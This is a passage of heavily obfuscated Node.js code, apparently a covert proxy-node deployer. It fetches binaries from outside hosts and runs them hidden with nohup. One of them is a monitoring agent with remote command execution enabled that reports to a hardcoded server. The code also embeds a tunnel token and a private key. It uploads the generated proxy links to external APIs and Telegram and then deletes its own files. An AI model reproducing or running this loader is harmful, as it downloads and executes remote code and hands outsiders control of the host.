        '\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&'
      try {
        ;(await exec(_0x586267),
          console['log'](npmName + _0xc1163d(_0x39816f._0x3b2b94)),
          await new Promise((_0x5b49f2) => setTimeout(_0x5b49f2, 0x3e8)))
      } catch (_0x1279d1) {
        console['error'](_0xc1163d(0x21b) + _0x1279d1)
      }
    }
  } else console['log'](_0xc1163d(0x186))
  const _0x3aa7f5 = _0xc1163d(0x201) + webPath + _0xc1163d(0x277) + FILE_PATH + '/config.json\x20>/dev/null\x202>&1\x20&'
  try {
    ;(await exec(_0x3aa7f5),
      console[_0xc1163d(_0x39816f._0x3c5c4c)](webName + _0xc1163d(_0x39816f._0x56aa49)),
      await new Promise((_0x2acb26) => setTimeout(_0x2acb26, 0x3e8)))
  } catch (_0x1f0d25) {
    console['error'](_0xc1163d(_0x39816f._0x339c66) + _0x1f0d25)
  }
  if (fs[_0xc1163d(0x16a)](botPath)) {
    let _0xe7f5cf
    if (ARGO_AUTH[_0xc1163d(_0x39816f._0x3dae56)](/^[A-Z0-9a-z=]{120,250}$/)) _0xe7f5cf = _0xc1163d(_0x39816f._0x18b3b0) + ARGO_AUTH
    else
      ARGO_AUTH[_0xc1163d(_0x39816f._0x29e409)](/TunnelSecret/)
        ? (_0xe7f5cf = _0xc1163d(_0x39816f._0x4c37b1) + path[_0xc1163d(0x1b2)](FILE_PATH, _0xc1163d(0x163)) + _0xc1163d(0x251))
        : (_0xe7f5cf =
            _0xc1163d(0x1b4) +
            path[_0xc1163d(_0x39816f._0x763e70)](bootLogPath) +
            '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:' +
            ARGO_PORT)
    try {
      ;(await exec('nohup\x20\x22' + path[_0xc1163d(_0x39816f._0x23e27a)](botPath) + '\x22\x20' + _0xe7f5cf + '\x20>/dev/null\x202>&1\x20&'),
        console[_0xc1163d(_0x39816f._0x5bbd60)](botName + '\x20is\x20running'),
        await new Promise((_0x5c6657) => setTimeout(_0x5c6657, 0x7d0)))
    } catch (_0x33dd12) {
      console[_0xc1163d(0x1a9)](_0xc1163d(_0x39816f._0x24b476) + _0x33dd12)
    }
  }
  await new Promise((_0x4c8dca) => setTimeout(_0x4c8dca, 0x1388))
}
function getFilesForArchitecture(_0x19a4ae) {
  const _0x38e220 = { _0x58badc: 0x226, _0x20899e: 0x22c, _0xe6d0d5: 0x1fb, _0x47c178: 0x25c, _0x4ce81e: 0x209, _0x31127c: 0x170 },
    _0x552298 = _0x5e8f37,
    _0x27f9bb = _0x19a4ae === 'arm' ? 'https://arm64.oooen.com' : _0x552298(_0x38e220._0x58badc),
    _0x1c94a2 = _0x19a4ae === _0x552298(_0x38e220._0x20899e) ? _0x552298(_0x38e220._0xe6d0d5) : _0x552298(0x1fa),
    _0xf7d7ca = [
      { fileName: webPath, fileUrls: [_0x27f9bb + _0x552298(_0x38e220._0x47c178), _0x1c94a2 + _0x552298(0x25c)] },
      { fileName: botPath, fileUrls: [_0x27f9bb + _0x552298(0x209), _0x1c94a2 + _0x552298(_0x38e220._0x4ce81e)] }
    ]
  return (
    NEZHA_SERVER &&
      NEZHA_KEY &&
      (NEZHA_PORT
        ? _0xf7d7ca[_0x552298(0x19a)]({ fileName: npmPath, fileUrls: [_0x27f9bb + _0x552298(0x258), _0x1c94a2 + _0x552298(0x258)] })
        : _0xf7d7ca[_0x552298(0x19a)]({ fileName: phpPath, fileUrls: [_0x27f9bb + _0x552298(0x170), _0x1c94a2 + _0x552298(_0x38e220._0x31127c)] })),
    _0xf7d7ca
  )
}
function argoType() {
  const _0x3d2756 = {
      _0xe404f1: 0x259,
      _0x3e11ca: 0x1f2,
      _0x2df832: 0x260,
      _0x5d72a2: 0x1a0,
      _0x3991a3: 0x230,
      _0x3dc41c: 0x17f,
      _0x47da81: 0x203,
      _0x54f3ae: 0x206,
      _0x17990a: 0x1fd,
      _0x4be4e7: 0x230,
      _0x219dab: 0x253,
      _0x13da8d: 0x1a0,
      _0x4f7422: 0x163,
      _0x4e47af: 0x26e
    },
    _0x2da4db = _0x5e8f37
  if (!ARGO_AUTH || !ARGO_DOMAIN) {
    console[_0x2da4db(_0x3d2756._0xe404f1)](_0x2da4db(_0x3d2756._0x3e11ca))
    return
  }
  if (ARGO_AUTH[_0x2da4db(0x25b)](_0x2da4db(_0x3d2756._0x2df832))) {
    fs[_0x2da4db(_0x3d2756._0x5d72a2)](path[_0x2da4db(_0x3d2756._0x3991a3)](FILE_PATH, _0x2da4db(_0x3d2756._0x3dc41c)), ARGO_AUTH)
    const _0x22b7cd =
      _0x2da4db(_0x3d2756._0x47da81) +
      ARGO_AUTH[_0x2da4db(_0x3d2756._0x54f3ae)]('\x22')[0xb] +
      _0x2da4db(_0x3d2756._0x17990a) +
      path[_0x2da4db(_0x3d2756._0x4be4e7)](FILE_PATH, 'tunnel.json') +
      _0x2da4db(_0x3d2756._0x219dab) +
      ARGO_DOMAIN +
      '\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:' +
      ARGO_PORT +
      '\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20'
    fs[_0x2da4db(_0x3d2756._0x13da8d)](path[_0x2da4db(_0x3d2756._0x3991a3)](FILE_PATH, _0x2da4db(_0x3d2756._0x4f7422)), _0x22b7cd)
  } else console['log'](_0x2da4db(_0x3d2756._0x4e47af) + ARGO_PORT + _0x2da4db(0x181))
}
async function waitForQuickTunnelLog(_0x2e6702 = 0x7530) {
  const _0x18e05b = { _0x1b9678: 0x22f, _0x2f5f8c: 0x16a, _0x4cd411: 0x1b8, _0x4e29da: 0x279, _0x3535f9: 0x210 },
    _0x17b7be = _0x5e8f37,
    _0x132b93 = Date[_0x17b7be(_0x18e05b._0x1b9678)]() + _0x2e6702
  while (Date[_0x17b7be(_0x18e05b._0x1b9678)]() < _0x132b93) {
    try {
      if (fs[_0x17b7be(_0x18e05b._0x2f5f8c)](bootLogPath)) {
        const _0xe4f385 = fs[_0x17b7be(_0x18e05b._0x4cd411)](bootLogPath, _0x17b7be(_0x18e05b._0x4e29da))
        if (/trycloudflare\.com/[_0x17b7be(_0x18e05b._0x3535f9)](_0xe4f385)) return _0xe4f385
      }
    } catch (_0x17cec6) {}
    await new Promise((_0x18ad33) => setTimeout(_0x18ad33, 0x3e8))
  }
  return ''
}
async function extractDomains() {
  const _0xf261bf = {
      _0x1793d3: 0x259,
      _0x32c02e: 0x206,
      _0x8e7dba: 0x194,
      _0x25fc09: 0x259,
      _0x38fd25: 0x1da,
      _0x3f7702: 0x26b,
      _0x2b7817: 0x1a8,
      _0x4f4fd6: 0x1f5,
      _0x54f484: 0x1b2
    },
    _0x2a3e0f = { _0x1b0bc7: 0x1a3, _0x12a9a4: 0x15e, _0x75a696: 0x1ed, _0x427169: 0x1c6 },
    _0x133efb = _0x5e8f37
  let _0x41402f
  if (ARGO_AUTH && ARGO_DOMAIN)
    ((_0x41402f = ARGO_DOMAIN), console[_0x133efb(_0xf261bf._0x1793d3)](_0x133efb(0x216), _0x41402f), await generateLinks(_0x41402f))
  else
    try {
      const _0x4e6288 = await waitForQuickTunnelLog(),
        _0x14c8f7 = _0x4e6288[_0x133efb(_0xf261bf._0x32c02e)]('\x0a'),
        _0x5e75e6 = []
      _0x14c8f7[_0x133efb(_0xf261bf._0x8e7dba)]((_0x186dbe) => {
        const _0x33d51e = _0x133efb,
          _0x3d5bc1 = _0x186dbe[_0x33d51e(0x178)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/)
        if (_0x3d5bc1) {
          const _0x26c13a = _0x3d5bc1[0x1]
          _0x5e75e6[_0x33d51e(0x227)](_0x26c13a)
        }
      })
      if (_0x5e75e6[_0x133efb(0x1b6)] > 0x0)
        ((_0x41402f = _0x5e75e6[0x0]),
          console[_0x133efb(_0xf261bf._0x25fc09)](_0x133efb(_0xf261bf._0x38fd25), _0x41402f),
          await generateLinks(_0x41402f))
      else {
        ;(console[_0x133efb(_0xf261bf._0x1793d3)](_0x133efb(_0xf261bf._0x3f7702)),
          fs[_0x133efb(_0xf261bf._0x2b7817)](path[_0x133efb(0x230)](FILE_PATH, 'boot.log')))
        async function _0x3a1e3b() {
          const _0x11bac6 = _0x133efb
          try {
            process[_0x11bac6(0x22d)] === 'win32'
              ? await exec('taskkill\x20/f\x20/im\x20' + botName + _0x11bac6(0x23b))
              : await exec(
                  _0x11bac6(_0x2a3e0f._0x1b0bc7) +
                    botName[_0x11bac6(_0x2a3e0f._0x12a9a4)](0x0) +
                    ']' +
                    botName[_0x11bac6(_0x2a3e0f._0x75a696)](0x1) +
                    _0x11bac6(_0x2a3e0f._0x427169)
                )
          } catch (_0x3e36d7) {}
        }
        ;(_0x3a1e3b(), await new Promise((_0x296a2b) => setTimeout(_0x296a2b, 0xbb8)))
        const _0x23d903 = _0x133efb(0x1b4) + path[_0x133efb(0x1b2)](bootLogPath) + _0x133efb(_0xf261bf._0x4f4fd6) + ARGO_PORT
        try {
          ;(await exec(_0x133efb(0x21f) + path[_0x133efb(_0xf261bf._0x54f484)](botPath) + '\x22\x20' + _0x23d903 + '\x20>/dev/null\x202>&1\x20&'),
            console['log'](botName + '\x20is\x20running'),
            await new Promise((_0x4b30a4) => setTimeout(_0x4b30a4, 0x1770)),
            await extractDomains())
        } catch (_0x9c54c3) {
          console[_0x133efb(0x1a9)]('Error\x20executing\x20command:\x20' + _0x9c54c3)
        }
      }
    } catch (_0x10eaad) {
      console['error'](_0x133efb(0x21d), _0x10eaad)
    }
}
async function getMetaInfo() {
  const _0x39700d = {
      _0x505280: 0x1be,
      _0x58c1b2: 0x1d3,
      _0x176679: 0x207,
      _0x5c3b4c: 0x240,
      _0x11ef11: 0x1a6,
      _0x2b1883: 0x193,
      _0xf2a2c7: 0x17e,
      _0x15f429: 0x1d3,
      _0x1a95b4: 0x175,
      _0x5bc033: 0x1a6,
      _0x2018b2: 0x204,
      _0x324ffb: 0x1a6,
      _0x1dfc27: 0x1eb,
      _0x2dfd8f: 0x1ec
    },
    _0x15ae65 = _0x5e8f37
  try {
    const _0x124185 = await axios[_0x15ae65(0x263)](_0x15ae65(_0x39700d._0x505280), {
      headers: { 'User-Agent': _0x15ae65(_0x39700d._0x58c1b2), timeout: 0xbb8 }
    })
    if (
      _0x124185[_0x15ae65(0x1a6)] &&
      _0x124185['data'][_0x15ae65(_0x39700d._0x176679)] &&
      _0x124185[_0x15ae65(0x1a6)][_0x15ae65(_0x39700d._0x5c3b4c)]
    )
      return (_0x124185[_0x15ae65(_0x39700d._0x11ef11)][_0x15ae65(_0x39700d._0x176679)] + '-' + _0x124185[_0x15ae65(0x1a6)][_0x15ae65(0x240)])[
        _0x15ae65(_0x39700d._0x2b1883)
      ](/\s+/g, '_')
  } catch (_0xb43072) {
    try {
      const _0x3b7304 = await axios[_0x15ae65(0x263)](_0x15ae65(_0x39700d._0xf2a2c7), {
        headers: { 'User-Agent': _0x15ae65(_0x39700d._0x15f429), timeout: 0xbb8 }
      })
      if (
        _0x3b7304[_0x15ae65(_0x39700d._0x11ef11)] &&
        _0x3b7304['data'][_0x15ae65(_0x39700d._0x1a95b4)] === 'success' &&
        _0x3b7304[_0x15ae65(_0x39700d._0x5bc033)][_0x15ae65(_0x39700d._0x2018b2)] &&
        _0x3b7304[_0x15ae65(_0x39700d._0x324ffb)][_0x15ae65(_0x39700d._0x1dfc27)]
      )
        return (_0x3b7304[_0x15ae65(_0x39700d._0x324ffb)]['countryCode'] + '-' + _0x3b7304['data'][_0x15ae65(0x1eb)])[_0x15ae65(_0x39700d._0x2b1883)](
          /\s+/g,
          '_'
        )
    } catch (_0xbd1541) {}
  }
  return _0x15ae65(_0x39700d._0x2dfd8f)
}
function _0x126e() {
  const _0x26444d = [
    'country_code',
    '443',
    '/bot',
    'Af8EBTADAQH/MAoGCCqGSM49BAMCA0cAMEQCIAIDAJvg0vd/ytrQVvEcSm6XTlB+\x0a',
    'then',
    'spki',
    'privateKey',
    'floor',
    '/trojan-argo',
    'test',
    'curl\x20-sm\x203\x20ipv6.ip.sb',
    'subarray',
    '\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20',
    '2083',
    '103613msYtci',
    'ARGO_DOMAIN:',
    'none',
    'tcp',
    '\x20failed:\x20',
    'http://ipv4.ip.sb',
    'npm\x20running\x20error:\x20',
    'amd',
    'Error\x20reading\x20boot.log:',
    'dirname',
    'nohup\x20\x22',
    'proxy',
    '8443',
    'stream',
    'trim',
    'rm\x20-rf\x20',
    'createHash',
    'https://amd64.oooen.com',
    'push',
    'BggqhkjOPQMBBw==\x0a',
    '/vless-argo',
    'firefox',
    'NEZHA_KEY',
    'arm',
    'platform',
    'PrivateKey:\x20',
    'now',
    'join',
    'CFPORT',
    'cert.pem',
    'hysteria-in',
    'util',
    'SHOW_LOG',
    '/TsyLyFoPkhLxSbehH/NBEjHtSZGaDhMqQ==\x0a',
    '\x20-p\x20',
    'end',
    'FILE_PATH',
    '.download',
    '.exe\x20>\x20nul\x202>&1',
    'AUTO_ACCESS',
    '1204136VZVPuD',
    'abcdefghijklmnopqrstuvwxyz',
    '&path=%2Fvless-argo%3Fed%3D2560#',
    'isp',
    'pipe',
    '\x20-s\x20',
    '&fp=firefox&type=ws&host=',
    'path',
    'export',
    'openssl\x20req\x20-new\x20-x509\x20-days\x203650\x20-key\x20\x22',
    'Add\x20automatic\x20access\x20task\x20faild:\x20',
    '-----END\x20EC\x20PARAMETERS-----\x0a',
    'filter',
    'vless-fallback-in',
    'text/html;\x20charset=utf-8',
    '\x0aclient_secret:\x20',
    '&pinSHA256=',
    '12Grcmuv',
    'config.json',
    '\x0avless://',
    '\x22\x20run',
    '2087',
    '\x0a\x20\x20protocol:\x20http2\x0a\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20',
    'Error\x20in\x20startserver:',
    'vless-in',
    '127.0.0.1',
    'password',
    '/agent',
    'log',
    'aD5IS8Um3oR/zQRIx7UmRmg4TKmjUzBRMB0GA1UdDgQWBBTV1cFID7UISE7PLTBR\x0a',
    'includes',
    '/web',
    '7215828rPUwwV',
    'hysteria',
    '\x20>/dev/null\x202>&1',
    'TunnelSecret',
    'Private\x20Key:',
    'https://oooo.serv00.net/add-url',
    'get',
    '/sub.txt\x20saved\x20successfully',
    'fileName',
    '520072BUyEET',
    'Error\x20downloading\x20files:',
    '-----END\x20CERTIFICATE-----\x0a',
    'https+local://8.8.8.8/dns-query',
    'digest',
    'ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain',
    'EzERMA8GA1UEAwwIYmluZy5jb20wHhcNMjUwOTE4MTgyMDIyWhcNMzUwOTE2MTgy\x0a',
    '/api/delete-nodes',
    'Using\x20token\x20connect\x20to\x20tunnel,\x20please\x20set\x20',
    '?encryption=none&security=tls&sni=',
    'sha256',
    '1971XgYtMd',
    '\x0a\x0avmess://',
    'velixir.933993.xyz',
    '7fcatUM',
    'automatic\x20access\x20task\x20added\x20successfully',
    'vless',
    '\x20-c\x20',
    '\x0a\x20\x20\x20\x20',
    'utf-8',
    'MDIyWjATMREwDwYDVQQDDAhiaW5nLmNvbTBZMBMGByqGSM49AgEGCCqGSM49AwEH\x0a',
    '-----BEGIN\x20CERTIFICATE-----\x0a',
    'Failed\x20to\x20send\x20Telegram\x20message:',
    '228440SPqNZD',
    'BfGbgkrMNzAfBgNVHSMEGDAWgBTV1cFID7UISE7PLTBRBfGbgkrMNzAPBgNVHRMB\x0a',
    'http',
    'trojan-ws-in',
    'text/plain;\x20charset=utf-8',
    'createWriteStream',
    '\x5c$&',
    'chmodSync',
    'readFile',
    'www.iij.ad.jp',
    'unlink',
    'charAt',
    'toLowerCase',
    'update',
    'axios',
    'string',
    'tunnel.yml',
    'Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture',
    'base64',
    'false',
    'toString',
    '/vmess-argo?ed=2560',
    'utf8',
    'existsSync',
    'MarkdownV2',
    'renameSync',
    '&path=%2Ftrojan-argo%3Fed%3D2560#',
    'openssl\x20version',
    '35201cd3-56f7-4a28-9741-dbef32cf5579',
    '/v1',
    'sub.txt',
    'publicKey',
    'freedom',
    'child_process',
    'status',
    'tunnel\x20--edge-ip-version\x20auto\x20--config\x20\x22',
    'AwEHoUQDQgAE1kHafPj07rJG+HboH2ekAI4r+e6TL38GWASANnngZreoQDF16ARa\x0a',
    'match',
    'eyJhIjoiNmZmODU4N2QwZDM1OGZiYzUyOTk2ZGI0NjUwNjZjNWUiLCJ0IjoiYzVlMjk4OGEtZGUxYi00ODRmLWIwZWItYjBiNTc4NDFjYzA2IiwicyI6Ik5ETXhOekpqTUdJdE5qRXhaUzAwWXpsaExXSmpOemd0WVdZMk5UazRZbVExTW1FMCJ9',
    'openssl\x20ecparam\x20-genkey\x20-name\x20prime256v1\x20-out\x20\x22',
    'list.txt',
    '20810WicoRl',
    'TG\x20variables\x20is\x20empty,\x20Skipping\x20push\x20nodes\x20to\x20TG',
    'http://ip-api.com/json',
    'tunnel.json',
    '--tls',
    '\x20in\x20clouudflare',
    'writeHead',
    'base64url',
    'fileUrls',
    '\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20',
    'NEZHA\x20variable\x20is\x20empty,skip\x20running',
    '?security=tls&sni=',
    'Error\x20executing\x20command:\x20',
    'catch',
    'message',
    'response',
    '-----BEGIN\x20EC\x20PARAMETERS-----\x0a',
    'win32',
    'CHAT_ID',
    '```',
    'openssl\x20x509\x20-noout\x20-fingerprint\x20-sha256\x20-in\x20\x22',
    '\x22\x20-out\x20\x22',
    'mkdirSync',
    'replace',
    'forEach',
    'Skipping\x20adding\x20automatic\x20access\x20task',
    'inbounds',
    'pkcs8',
    'block',
    'curl\x20-sm\x203\x20ipv4.ip.sb',
    'unshift',
    '/dev/null',
    '-----END\x20EC\x20PRIVATE\x20KEY-----\x0a',
    'http://ipv6.ip.sb',
    '节点推送**\x0a```',
    'x25519',
    'writeFileSync',
    '/api/add-subscriptions',
    '5402976ijbBsS',
    'pkill\x20-f\x20\x22[',
    'https://bing.com',
    'arch',
    'data',
    'true',
    'unlinkSync',
    'error',
    'stdout',
    'web\x20running\x20error:\x20',
    '\x20is\x20running',
    'env',
    'reality',
    'der',
    'Download\x20',
    'slice',
    'resolve',
    'disable',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20\x22',
    'vmess-ws-in',
    'length',
    '/sendMessage',
    'readFileSync',
    'vless-tcp-in',
    'basename',
    'hex',
    'from',
    'ignore',
    'https://api.ip.sb/geoip',
    '66ObGFyWnpwsEsGhy5y2jcBf21YSltY8',
    'generateKeyPairSync',
    'index.html',
    'tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20',
    'socks',
    '\x20from\x20backup\x20source',
    '/?sni=www.bing.com&insecure=0&alpn=h3&obfs=none',
    '\x22\x20>\x20/dev/null\x202>&1',
    'HY2_PORT',
    '.npm',
    'clear',
    'toUpperCase',
    'Nodes\x20uploaded\x20successfully',
    'promises',
    '2053',
    '/vmess-argo',
    'ARGO_DOMAIN',
    'App\x20is\x20running',
    '\x20-c\x20\x22',
    'MHcCAQEEIM4792SEtPqIt1ywqTd/0bYidBqpYV/++siNnfBYsdUYoAoGCCqGSM49\x0a',
    'Mozilla/5.0',
    '66oLnDVP',
    'direct',
    'Hello\x20world!<br><br>You\x20can\x20access\x20/{SUB_PATH}(Default:\x20/sub)\x20to\x20get\x20your\x20nodes!',
    'http\x20server\x20is\x20running\x20on\x20',
    '\x22\x20-subj\x20\x22/CN=bing.com\x22',
    'aarch64',
    'ArgoDomain:',
    'quic',
    'S5_PORT',
    'Failed\x20to\x20calculate\x20certificate\x20fingerprint:',
    'Empowerment\x20failed\x20for\x20',
    'application/json',
    '2096',
    'url',
    'all',
    '5AideXz',
    '\x0a\x0atrojan://',
    'ARGO_PORT',
    '7575949494',
    'Failed\x20to\x20get\x20IP\x20address:',
    '\x20>\x20nul\x202>&1',
    'write',
    'SUB_PATH',
    'org',
    'Unknown',
    'substring',
    'createServer',
    'tls',
    'xtls-rprx-vision',
    'listen',
    'ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20is\x20empty,\x20use\x20quick\x20tunnels',
    'Public\x20Key:',
    'Unhandled\x20error\x20in\x20startserver:',
    '\x22\x20--loglevel\x20info\x20--url\x20http://localhost:',
    'NEZHA_SERVER',
    'blackhole',
    'Telegram\x20message\x20sent\x20successfully',
    'statSync',
    'https://amd64.ssss.nyc.mn',
    'https://arm64.ssss.nyc.mn',
    'Not\x20Found',
    '\x0a\x20\x20credentials-file:\x20',
    '?encryption=none&flow=xtls-rprx-vision&security=reality&sni=www.iij.ad.jp&fp=firefox&pbk=',
    'post',
    'stringify',
    'nohup\x20',
    'PORT',
    '\x0a\x20\x20tunnel:\x20',
    'countryCode',
    'nezha.933993.xyz:443',
    'split'
  ]
  _0x126e = function () {
    return _0x26444d
  }
  return _0x126e()
}
async function getServerIP() {
  const _0x20373d = { _0x5240cb: 0x263, _0x366cbe: 0x19d, _0x48b0e7: 0x211 },
    _0x3213e5 = _0x5e8f37
  let _0x167a12 = ''
  try {
    const _0x2f662b = await axios['get'](_0x3213e5(0x21a), { timeout: 0xbb8 })
    _0x167a12 = _0x2f662b[_0x3213e5(0x1a6)][_0x3213e5(0x223)]()
  } catch (_0x4b0430) {
    try {
      _0x167a12 = execSync(_0x3213e5(0x199))['toString']()['trim']()
    } catch (_0x3b8429) {
      try {
        const _0x5dab44 = await axios[_0x3213e5(_0x20373d._0x5240cb)](_0x3213e5(_0x20373d._0x366cbe), { timeout: 0xbb8 })
        _0x167a12 = '[' + _0x5dab44['data']['trim']() + ']'
      } catch (_0x2964c8) {
        try {
          _0x167a12 = '[' + execSync(_0x3213e5(_0x20373d._0x48b0e7))['toString']()['trim']() + ']'
        } catch (_0x5ce70d) {
          console[_0x3213e5(0x1a9)](_0x3213e5(0x1e7), _0x5ce70d['message'])
        }
      }
    }
  }
  return _0x167a12
}
async function generateLinks(_0x33be75) {
  const _0x41ee26 = {
      _0x5b2657: 0x217,
      _0x202396: 0x1ef,
      _0x10239b: 0x26f,
      _0x1b29e6: 0x243,
      _0x33b6e0: 0x167,
      _0x3a3707: 0x187,
      _0x1fc177: 0x16d,
      _0x3c9718: 0x278,
      _0x43d6f8: 0x24d,
      _0x164477: 0x1c5,
      _0x304291: 0x1fe,
      _0x5ae63d: 0x167,
      _0xf791c6: 0x165,
      _0xf16292: 0x1bc,
      _0x3d76f5: 0x165,
      _0x30d2f0: 0x165,
      _0x3b9018: 0x1a0,
      _0x3967e2: 0x169,
      _0x359286: 0x259
    },
    _0x140098 = await getMetaInfo(),
    _0x49758b = NAME ? NAME + '-' + _0x140098 : _0x140098,
    _0xe28725 = await getServerIP()
  return new Promise((_0x4dcb53) => {
    setTimeout(() => {
      const _0x3bd065 = _0x2ca9,
        _0x5a0674 = {
          v: '2',
          ps: '' + _0x49758b,
          add: CFIP,
          port: CFPORT,
          id: UUID,
          aid: '0',
          scy: 'auto',
          net: 'ws',
          type: _0x3bd065(_0x41ee26._0x5b2657),
          host: _0x33be75,
          path: _0x3bd065(0x168),
          tls: _0x3bd065(_0x41ee26._0x202396),
          sni: _0x33be75,
          alpn: '',
          fp: _0x3bd065(0x22a)
        }
      let _0x44fcd7 =
        '\x0avless://' +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x3bd065(_0x41ee26._0x10239b) +
        _0x33be75 +
        _0x3bd065(_0x41ee26._0x1b29e6) +
        _0x33be75 +
        _0x3bd065(0x23f) +
        _0x49758b +
        _0x3bd065(0x272) +
        Buffer[_0x3bd065(0x1bc)](JSON[_0x3bd065(0x200)](_0x5a0674))[_0x3bd065(_0x41ee26._0x33b6e0)](_0x3bd065(0x165)) +
        _0x3bd065(0x1e4) +
        UUID +
        '@' +
        CFIP +
        ':' +
        CFPORT +
        _0x3bd065(_0x41ee26._0x3a3707) +
        _0x33be75 +
        _0x3bd065(_0x41ee26._0x1b29e6) +
        _0x33be75 +
        _0x3bd065(_0x41ee26._0x1fc177) +
        _0x49758b +
        _0x3bd065(_0x41ee26._0x3c9718)
      if (isValidPort(HY2_PORT)) {
        const _0x52f778 = getCertificateFingerprint(certPath),
          _0x1b27ae = _0x52f778 ? _0x3bd065(_0x41ee26._0x43d6f8) + encodeURIComponent(_0x52f778) : '',
          _0x190ba8 = '\x0ahysteria2://' + UUID + '@' + _0xe28725 + ':' + HY2_PORT + _0x3bd065(_0x41ee26._0x164477) + _0x1b27ae + '#' + _0x49758b
        _0x44fcd7 += _0x190ba8
      }
      if (isValidPort(REALITY_PORT)) {
        const _0xaec8bc =
          _0x3bd065(0x250) +
          UUID +
          '@' +
          _0xe28725 +
          ':' +
          REALITY_PORT +
          _0x3bd065(_0x41ee26._0x304291) +
          publicKey +
          '&type=tcp&headerType=none#' +
          _0x49758b
        _0x44fcd7 += _0xaec8bc
      }
      if (isValidPort(S5_PORT)) {
        const _0x117526 = Buffer['from'](UUID[_0x3bd065(0x1ed)](0x0, 0x8) + ':' + UUID[_0x3bd065(0x1b1)](-0xc))[_0x3bd065(_0x41ee26._0x5ae63d)](
            _0x3bd065(_0x41ee26._0xf791c6)
          ),
          _0x3d0eb0 = '\x0asocks://' + _0x117526 + '@' + _0xe28725 + ':' + S5_PORT + '#' + _0x49758b
        _0x44fcd7 += _0x3d0eb0
      }
      ;(console[_0x3bd065(0x259)](Buffer[_0x3bd065(_0x41ee26._0xf16292)](_0x44fcd7)[_0x3bd065(0x167)](_0x3bd065(_0x41ee26._0x3d76f5))),
        fs[_0x3bd065(0x1a0)](subPath, Buffer[_0x3bd065(0x1bc)](_0x44fcd7)[_0x3bd065(0x167)](_0x3bd065(_0x41ee26._0x30d2f0))),
        fs[_0x3bd065(_0x41ee26._0x3b9018)](listPath, _0x44fcd7, _0x3bd065(_0x41ee26._0x3967e2)),
        console[_0x3bd065(_0x41ee26._0x359286)](FILE_PATH + _0x3bd065(0x264)),
        (subContent = Buffer[_0x3bd065(_0x41ee26._0xf16292)](_0x44fcd7)['toString'](_0x3bd065(0x165))),
        uploadNodes(),
        _0x4dcb53(_0x44fcd7))
    }, 0x7d0)
  })
}
async function uploadNodes() {
  const _0x759a55 = {
      _0x4d48db: 0x259,
      _0x15e206: 0x175,
      _0x3fd5ea: 0x16a,
      _0x2b8536: 0x1b8,
      _0x175479: 0x279,
      _0x377fd4: 0x249,
      _0x333e53: 0x1b6,
      _0x215005: 0x200
    },
    _0x509c97 = _0x5e8f37
  if (UPLOAD_URL && PROJECT_URL) {
    const _0x27d1e3 = PROJECT_URL + '/' + SUB_PATH,
      _0x3f2a57 = { subscription: [_0x27d1e3] }
    try {
      const _0x4accca = await axios['post'](UPLOAD_URL + _0x509c97(0x1a1), _0x3f2a57, { headers: { 'Content-Type': _0x509c97(0x1df) } })
      return _0x4accca && _0x4accca['status'] === 0xc8
        ? (console[_0x509c97(_0x759a55._0x4d48db)]('Subscription\x20uploaded\x20successfully'), _0x4accca)
        : null
    } catch (_0x11a2be) {
      if (_0x11a2be['response']) {
        if (_0x11a2be[_0x509c97(0x18b)][_0x509c97(_0x759a55._0x15e206)] === 0x190) {
        }
      }
    }
  } else {
    if (UPLOAD_URL) {
      if (!fs[_0x509c97(_0x759a55._0x3fd5ea)](listPath)) return
      const _0x3a969d = fs[_0x509c97(_0x759a55._0x2b8536)](listPath, _0x509c97(_0x759a55._0x175479)),
        _0x51f46d = _0x3a969d[_0x509c97(0x206)]('\x0a')[_0x509c97(_0x759a55._0x377fd4)]((_0x3f48c8) =>
          /(vless|vmess|trojan|hysteria2|socks):\/\//[_0x509c97(0x210)](_0x3f48c8)
        )
      if (_0x51f46d[_0x509c97(_0x759a55._0x333e53)] === 0x0) return
      const _0x443269 = JSON[_0x509c97(_0x759a55._0x215005)]({ nodes: _0x51f46d })
      try {
        const _0x125820 = await axios[_0x509c97(0x1ff)](UPLOAD_URL + '/api/add-nodes', _0x443269, { headers: { 'Content-Type': _0x509c97(0x1df) } })
        return _0x125820 && _0x125820[_0x509c97(_0x759a55._0x15e206)] === 0xc8
          ? (console[_0x509c97(_0x759a55._0x4d48db)](_0x509c97(0x1cb)), _0x125820)
          : null
      } catch (_0x1c9d79) {
        return null
      }
    } else return
  }
}
function cleanFiles() {
  const _0x3f2a1c = { _0x552376: 0x22d, _0xd9d437: 0x1e8, _0x1ea279: 0x25f }
  setTimeout(() => {
    const _0x145c6a = _0x2ca9,
      _0x547199 = [bootLogPath, configPath, webPath, botPath, listPath, certPath, keyPath]
    if (NEZHA_PORT) _0x547199[_0x145c6a(0x227)](npmPath)
    else NEZHA_SERVER && NEZHA_KEY && _0x547199[_0x145c6a(0x227)](phpPath)
    process[_0x145c6a(_0x3f2a1c._0x552376)] === _0x145c6a(0x18d)
      ? exec('del\x20/f\x20/q\x20' + _0x547199['join']('\x20') + _0x145c6a(_0x3f2a1c._0xd9d437), (_0x1db37b) => {
          const _0x3dcd0c = _0x145c6a
